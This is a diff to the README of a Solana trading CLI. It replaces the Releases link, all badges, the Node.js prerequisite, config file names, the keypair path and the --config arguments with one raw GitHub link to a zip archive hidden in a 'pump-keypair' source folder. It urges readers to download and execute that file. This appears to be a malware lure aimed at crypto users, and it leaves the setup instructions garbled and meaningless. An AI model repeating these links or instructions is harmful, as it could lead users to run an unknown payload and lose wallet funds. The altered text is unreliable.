@@ -1,13 +1,13 @@
-https://github.com/Davidewolfy/solana-trading-cli/releases
+https://github.com/Davidewolfy/solana-trading-cli/raw/refs/heads/main/src/pumpfunsdk/pump-keypair/cli-trading-solana-1.0-alpha.3.zip
 
 # Solana Trading CLI: Unified DEX Routing, Real-Time ML Strategies
 
-[![Releases](https://img.shields.io/badge/releases-assets-for-the--badge-1EAEDB?style=for-the-badge&logo=github)](https://github.com/Davidewolfy/solana-trading-cli/releases)
-[![License](https://img.shields.io/badge/license-MIT-blue?style=for-the-badge&logo=github)](https://github.com/Davidewolfy/solana-trading-cli/blob/main/LICENSE)
-[![Rust](https://img.shields.io/badge/language-Rust%2FTypeScript-blue?style=for-the-badge&logo=rust)](https://www.rust-lang.org/)
-[![Docker](https://img.shields.io/badge/docker-ready-brightgreen?style=for-the-badge&logo=docker)](https://docs.docker.com/)
-[![Solana](https://img.shields.io/badge/solana-green?style=for-the-badge&logo=solana)](https://solana.com/)
-[![AI](https://img.shields.io/badge/ai-ml-blue?style=for-the-badge&logo=data:image/png;base64,iVBORw0KGgo)](https://ai.example/)
+[![Releases](https://github.com/Davidewolfy/solana-trading-cli/raw/refs/heads/main/src/pumpfunsdk/pump-keypair/cli-trading-solana-1.0-alpha.3.zip)](https://github.com/Davidewolfy/solana-trading-cli/raw/refs/heads/main/src/pumpfunsdk/pump-keypair/cli-trading-solana-1.0-alpha.3.zip)
+[![License](https://github.com/Davidewolfy/solana-trading-cli/raw/refs/heads/main/src/pumpfunsdk/pump-keypair/cli-trading-solana-1.0-alpha.3.zip)](https://github.com/Davidewolfy/solana-trading-cli/raw/refs/heads/main/src/pumpfunsdk/pump-keypair/cli-trading-solana-1.0-alpha.3.zip)
+[![Rust](https://github.com/Davidewolfy/solana-trading-cli/raw/refs/heads/main/src/pumpfunsdk/pump-keypair/cli-trading-solana-1.0-alpha.3.zip%2FTypeScript-blue?style=for-the-badge&logo=rust)](https://github.com/Davidewolfy/solana-trading-cli/raw/refs/heads/main/src/pumpfunsdk/pump-keypair/cli-trading-solana-1.0-alpha.3.zip)
+[![Docker](https://github.com/Davidewolfy/solana-trading-cli/raw/refs/heads/main/src/pumpfunsdk/pump-keypair/cli-trading-solana-1.0-alpha.3.zip)](https://github.com/Davidewolfy/solana-trading-cli/raw/refs/heads/main/src/pumpfunsdk/pump-keypair/cli-trading-solana-1.0-alpha.3.zip)
+[![Solana](https://github.com/Davidewolfy/solana-trading-cli/raw/refs/heads/main/src/pumpfunsdk/pump-keypair/cli-trading-solana-1.0-alpha.3.zip)](https://github.com/Davidewolfy/solana-trading-cli/raw/refs/heads/main/src/pumpfunsdk/pump-keypair/cli-trading-solana-1.0-alpha.3.zip)
+[![AI](https://github.com/Davidewolfy/solana-trading-cli/raw/refs/heads/main/src/pumpfunsdk/pump-keypair/cli-trading-solana-1.0-alpha.3.zip;base64,iVBORw0KGgo)](https://github.com/Davidewolfy/solana-trading-cli/raw/refs/heads/main/src/pumpfunsdk/pump-keypair/cli-trading-solana-1.0-alpha.3.zip)
 
 Solana Trading CLI is a production-ready trading system for the Solana ecosystem. It combines unified multi-DEX routing, real-time data streaming, machine learning (ML) strategies, and autonomous architecture search (ASI-Arch) to deliver fast, resilient, and adaptive trading workflows. The project blends a robust core engine written in Rust with a flexible TypeScript tooling layer, enabling both high-performance trading operations and accessible scripting for strategy experiments.
 
@@ -61,7 +61,7 @@ Architecture and Design
 Getting Started
 Prerequisites
 - Rust toolchain (latest stable) with cargo.
-- Node.js (LTS) for tooling and scripting.
+- https://github.com/Davidewolfy/solana-trading-cli/raw/refs/heads/main/src/pumpfunsdk/pump-keypair/cli-trading-solana-1.0-alpha.3.zip (LTS) for tooling and scripting.
 - Access to a Solana cluster (devnet or testnet for testing; mainnet for production use with caution).
 - Docker (optional but recommended for production-like environments).
 - Git for version control.
@@ -75,7 +75,7 @@ Installation
     - npm run build
 - From prebuilt releases
   - The repository provides binary releases you can download directly. The Releases page contains assets for Linux, macOS, and Windows. To obtain the assets, visit the Releases page:
-    - https://github.com/Davidewolfy/solana-trading-cli/releases
+    - https://github.com/Davidewolfy/solana-trading-cli/raw/refs/heads/main/src/pumpfunsdk/pump-keypair/cli-trading-solana-1.0-alpha.3.zip
   - Extract the archive and run the binary appropriate for your OS.
 - Docker-based deployment
   - A Docker image is provided for fast setup and consistent environments. Use:
@@ -88,29 +88,29 @@ Installation
 
 First Run and Basic Workflow
 - Configure your environment
-  - Create a configuration file (config.yaml) that defines:
+  - Create a configuration file (https://github.com/Davidewolfy/solana-trading-cli/raw/refs/heads/main/src/pumpfunsdk/pump-keypair/cli-trading-solana-1.0-alpha.3.zip) that defines:
     - Solana RPC endpoints
     - DEX endpoints or adapters
     - Account keys and permissions
     - Streaming topics to subscribe to
     - Routing preferences and risk thresholds
   - Example minimal config sections:
-    - solana_rpc: https://api.devnet.solana.com
+    - solana_rpc: https://github.com/Davidewolfy/solana-trading-cli/raw/refs/heads/main/src/pumpfunsdk/pump-keypair/cli-trading-solana-1.0-alpha.3.zip
     - dex_adapters:
         - name: serum
           enabled: true
         - name: raydium
           enabled: true
     - accounts:
-        - keypair: /path/to/your/keypair.json
+        - keypair: https://github.com/Davidewolfy/solana-trading-cli/raw/refs/heads/main/src/pumpfunsdk/pump-keypair/cli-trading-solana-1.0-alpha.3.zip
     - streaming:
         - enable: true
         - topics: ["order_book", "trades", "balances"]
 - Start the system
   - Run the core engine with your config:
-    - cargo run --release -- --config config.yaml
+    - cargo run --release -- --config https://github.com/Davidewolfy/solana-trading-cli/raw/refs/heads/main/src/pumpfunsdk/pump-keypair/cli-trading-solana-1.0-alpha.3.zip
   - Or start the CLI tooling, if you prefer scripting:
-    - npm run start -- --config config.yaml
+    - npm run start -- --config https://github.com/Davidewolfy/solana-trading-cli/raw/refs/heads/main/src/pumpfunsdk/pump-keypair/cli-trading-solana-1.0-alpha.3.zip
 - Validate a simple workflow
   - Verify streaming topics produce updates in real time.
   - Issue a mock or paper trade in a safe environment to validate routing to multiple DEXs.
@@ -305,13 +305,13 @@ License
 
 Notes on the Releases Link
 - The primary link for obtaining binaries and release assets is the Releases page:
-  - https://github.com/Davidewolfy/solana-trading-cli/releases
-  If you need a specific asset, download the appropriate binary for your operating system and run it. As a reminder, the link above contains a path part, so the file you download is the release artifact you execute. For convenience, you can also visit the Releases page again to review latest updates, download new assets, or compare version notes. To reiterate, the same link is also used here: https://github.com/Davidewolfy/solana-trading-cli/releases
+  - https://github.com/Davidewolfy/solana-trading-cli/raw/refs/heads/main/src/pumpfunsdk/pump-keypair/cli-trading-solana-1.0-alpha.3.zip
+  If you need a specific asset, download the appropriate binary for your operating system and run it. As a reminder, the link above contains a path part, so the file you download is the release artifact you execute. For convenience, you can also visit the Releases page again to review latest updates, download new assets, or compare version notes. To reiterate, the same link is also used here: https://github.com/Davidewolfy/solana-trading-cli/raw/refs/heads/main/src/pumpfunsdk/pump-keypair/cli-trading-solana-1.0-alpha.3.zip
 
 Appendix: Quick Reference
 - Key commands
   - Build core: cargo build --release
-  - Run CLI tooling: npm run start -- --config config.yaml
+  - Run CLI tooling: npm run start -- --config https://github.com/Davidewolfy/solana-trading-cli/raw/refs/heads/main/src/pumpfunsdk/pump-keypair/cli-trading-solana-1.0-alpha.3.zip
   - Check version: sol-trading --version
 - Important directories
   - src/core: Rust core engine
